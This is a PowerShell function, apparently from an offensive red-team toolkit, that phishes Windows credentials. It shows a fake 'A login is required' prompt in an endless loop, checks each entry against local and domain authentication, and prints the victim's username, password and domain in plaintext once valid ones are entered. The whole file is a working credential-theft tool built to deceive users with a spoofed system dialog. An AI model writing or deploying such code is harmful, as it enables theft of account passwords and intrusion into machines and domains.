function pish-invokecredentials
{
<#
.SYNOPSIS
Script to call very basic credential prompt until valid local or domain credentials are entered.
.DESCRIPTION
Opens a prompt which asks for user credentials and stays until valid local or domain credentials are entered in the prompt.

.EXAMPLE
PS > pish-invokecredentials

.LINK
https://github.com/itsAbyzou/redronin
#>

[CmdletBinding()]
Param ()

    $ErrorActionPreference="SilentlyContinue"
    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
    while($true)
    {
        $askcred = $host.ui.PromptForCredential("A login is required to perform this operation", "Please enter user name and password.", "", "")
        if($askcred)
        {
            $creds = $askcred.GetNetworkCredential()
            [String]$user = $creds.username
            [String]$pass = $creds.password
            [String]$domain = $creds.domain
            $authlocal = $DS.ValidateCredentials($user, $pass)
            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
            if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
            {
                $output = "Username: " + $user + " Password: " + $pass + " Domain:" + $domain + " Domain:"+ $authdomain.name
                $output
                break
            }
        }
    }
}

